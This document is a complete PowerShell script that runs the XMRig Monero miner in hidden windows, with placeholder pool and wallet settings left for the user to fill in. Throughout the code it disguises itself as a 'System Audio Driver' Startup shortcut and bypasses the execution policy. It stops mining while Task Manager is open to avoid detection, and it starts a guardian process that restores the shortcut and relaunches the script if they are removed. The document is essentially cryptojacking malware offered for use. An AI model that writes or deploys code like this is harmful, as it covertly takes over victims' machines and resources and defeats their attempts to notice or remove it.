# --- XMRIG CONFIGURATION - ENTER YOUR DETAILS HERE ---
$MiningPoolUrl = "your-monero-pool.com:4444"  # REPLACE with your pool's address and port
$WalletAddress = "YOUR_MONERO_WALLET_ADDRESS" # REPLACE with your Monero wallet address
$WorkerName = "worker1"                       # REPLACE with a name for this computer
# ----------------------------------------------------

# --- SCRIPT CONFIGURATION ---
$MinerProcessName = "xmrig"
$MinerExecutable = "$PSScriptRoot\$MinerProcessName.exe"
$StartupFolderPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$ShortcutPath = Join-Path $StartupFolderPath "SystemAudioDriver.lnk" # Disguised shortcut name
$CurrentScriptPath = $MyInvocation.MyCommand.Path

# --- FUNCTIONS ---

# Ensures the script runs on startup by creating a disguised shortcut.
function Ensure-StartupPersistence {
    if (-not (Test-Path $ShortcutPath)) {
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
        $Shortcut.TargetPath = "powershell.exe"
        $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$CurrentScriptPath`""
        $Shortcut.IconLocation = "wmploc.dll,100" # A generic system icon
        $Shortcut.Description = "System Audio Driver"
        $Shortcut.Save()
    }
}

# Determines the required mining intensity based on running processes.
function Get-MiningState {
    $isTaskMgrOpen = (Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue) -ne $null
    $isFlStudioOpen = (Get-Process -Name "FL Studio" -ErrorAction SilentlyContinue) -ne $null

    if ($isTaskMgrOpen) {
        return "none" # Pause mining if Task Manager is open.
    } elseif ($isFlStudioOpen) {
        return "high" # High intensity (50% threads) if FL Studio is open.
    } else {
        return "low"  # Low intensity (25% threads) otherwise.
    }
}

# Manages the XMRig miner process.
function Manage-MinerProcess {
    param(
        [string]$TargetState
    )

    $existingMiner = Get-Process -Name $MinerProcessName -ErrorAction SilentlyContinue

    if ($TargetState -eq "none") {
        if ($existingMiner) {
            # If the miner should be off, stop it.
            Stop-Process -Name $MinerProcessName -Force -ErrorAction SilentlyContinue
        }
        return
    }

    # Determine the command-line arguments for the target state.
    $threadHint = if ($TargetState -eq "high") { 50 } else { 25 }
    $arguments = "-o $MiningPoolUrl -u $WalletAddress -p $WorkerName -k --cpu-max-threads-hint=$threadHint --background --no-color"

    if ($existingMiner) {
        # Miner is running. Check if its command line matches the target state.
        # This is a simple way to see if the thread hint needs changing.
        $commandLine = (Get-CimInstance Win32_Process -Filter "ProcessId = $($existingMiner.Id)").CommandLine
        if ($commandLine -notlike "*--cpu-max-threads-hint=$threadHint*") {
            # If config is wrong, kill and restart.
            Stop-Process -Name $MinerProcessName -Force
            Start-Process -FilePath $MinerExecutable -ArgumentList $arguments -WindowStyle Hidden
        }
    } else {
        # Miner is not running, so start it with the correct state.
        Start-Process -FilePath $MinerExecutable -ArgumentList $arguments -WindowStyle Hidden
    }
}

# --- SELF-HEALING GUARDIAN ---
# This detached process restarts the main script if it's killed.
$GuardianScriptBlock = {
    param($MainScriptPath, $MainProcessId, $ShortcutPath)
    Wait-Process -Id $MainProcessId -ErrorAction SilentlyContinue
    while ((Get-Process -Name "Taskmgr", "explorer" -ErrorAction SilentlyContinue)) {
        Start-Sleep -Seconds 5
    }
    # Re-create shortcut if deleted and relaunch the main script.
    if (-not (Test-Path $ShortcutPath)) {
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
        $Shortcut.TargetPath = "powershell.exe"; $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$MainScriptPath`""; $Shortcut.IconLocation = "wmploc.dll,100"; $Shortcut.Description = "System Audio Driver"; $Shortcut.Save()
    }
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$MainScriptPath`""
}

if ($env:GuardianStarted -ne "true") {
    $env:GuardianStarted = "true"
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & { $GuardianScriptBlock }", "-MainScriptPath '$CurrentScriptPath'", "-MainProcessId $PID", "-ShortcutPath '$ShortcutPath'" -WindowStyle Hidden
}

# --- MAIN EXECUTION LOOP ---
Ensure-StartupPersistence
while ($true) {
    try {
        $state = Get-MiningState
        Manage-MinerProcess -TargetState $state
    }
    catch {}
    Start-Sleep -Seconds 2
}